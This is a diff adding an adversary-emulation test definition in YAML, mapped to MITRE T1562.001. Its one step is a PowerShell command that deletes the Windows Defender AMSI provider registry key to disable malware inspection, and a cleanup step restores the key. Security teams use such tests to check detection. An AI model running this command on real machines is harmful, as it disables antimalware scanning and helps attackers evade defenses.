@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: AMSI Bypass - Remove AMSI Provider Reg Key
+description: |
+    With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+    This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
+    Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.
+uuid: 13f09b91-c953-438e-845b-b585e51cac9b
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.001: Disable or Modify Tools'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: amsi-bypass---remove-amsi-provider-reg-key
+      inline: |
+        Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+      executor: powershell
+      cleanup:
+        inline: |
+            New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
+        executor: powershell
